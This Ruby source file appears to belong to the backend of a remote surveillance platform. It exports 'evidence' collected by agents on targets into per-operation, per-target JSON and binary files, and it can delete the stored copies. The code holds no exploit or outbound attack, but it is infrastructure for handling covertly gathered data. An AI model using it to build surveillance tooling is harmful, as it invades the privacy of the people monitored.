#
# The forwarding subsystem (for connectors with third party)
#

# from RCS::Common
require 'rcs-common/trace'

require 'pp'

module RCS
module DB

class Connectors
  extend RCS::Tracer

  class << self

    def check_connector(f, agent)
      # skip non matching rules
      return :skip unless match_path(f, agent)
      # check for unsupported types
      return :unsupported if f.type != 'JSON'
      return :ok
    end

    def get_parents(agent)
      operation = ::Item.find(agent.path.first)
      target = ::Item.find(agent.path.last)
      return operation, target
    end

    def new_evidence(evidence)
      ::Connector.where(:enabled => true).each do |f|

        # the generator of the evidence
        agent = ::Item.find(evidence.aid)

        # skip non matching rules or unsupported types
        action = check_connector(f, agent)
        next if action == :skip
        raise "unsupported forwarding method: #{f.type}" if action == :unsupported
        
        # get the parents
        operation, target = get_parents agent
        
        # the full exporting path will be splitted in subdir (one for each item)
        path = File.join(f.dest, operation.name + '-' + operation[:_id].to_s,
                                 target.name + '-' + target[:_id].to_s,
                                 agent.name + '-' + agent[:_id].to_s)

        # ensure the dest dir is created
        FileUtils.mkdir_p path

        # make a deep copy to prepare it for export
        exported = evidence.as_document.dup
        exported['data'] = evidence['data'].dup

        # don't export uninteresting fields
        exported.delete('blo')
        exported.delete('note')
        exported.delete('kw')

        # insert operation and target references
        exported['oid'] = operation[:_id].to_s
        exported['tid'] = target[:_id].to_s

        exported['operation'] = operation.name
        exported['target'] = target.name
        exported['agent'] = agent.name

        if exported['data'][:_grid]
          exported['data'].delete(:_grid)
          exported['data'][:_bin_size] = exported['data'].delete(:_grid_size)
        end

        # convert it to json
        exported = exported.to_json

        # dump the evidence
        File.open(File.join(path, evidence[:_id].to_s + '.json'), 'wb') {|d| d.write exported}

        # dump the binary (if any)
        if evidence[:data][:_grid]
          file = GridFS.get evidence[:data][:_grid], target[:_id].to_s
          File.open(File.join(path, evidence[:_id].to_s + '.bin'), 'wb') {|d| d.write file.read}
        end
        
        # delete the evidence if the rule specify to not store it in the db
        if f.keep
          return true
        else
          evidence.destroy
          return false
        end
      end
    end
    
    def new_raw(raw_id, index, agent, evidence_id)
      ::Connector.where(:enabled => true).each do |f|

        # skip non matching rules or unsupported types
        action = check_connector(f, agent)
        next if action == :skip
        raise "unsupported forwarding method: #{f.type}" if action == :unsupported
        
        # get the parents
        operation, target = get_parents agent

        # the full exporting path will be splitted in subdir (one for each item)
        path = File.join(f.dest, operation.name + '-' + operation[:_id].to_s,
                                 target.name + '-' + target[:_id].to_s,
                                 agent.name + '-' + agent[:_id].to_s)

        # ensure the dest dir is created
        FileUtils.mkdir_p path
        
        return unless f.raw
        file = GridFS.get raw_id, 'evidence'
        File.open(File.join(path, evidence_id + '-' + index + '.raw'), 'wb') {|d| d.write file.read}
      end
    end
    
    def match_path(connector, agent)
      # empty path means everything
      return true if connector.path.empty?
      
      # the path of an agent does not include itself, add it to obtain the full path
      agent_path = agent.path + [agent._id]
      
      # check if the agent path is included in the path
      # this way an alert on a target will be triggered by all of its agent
      (agent_path & connector.path == connector.path)
    end
  end

end

end # ::DB
end # ::RCS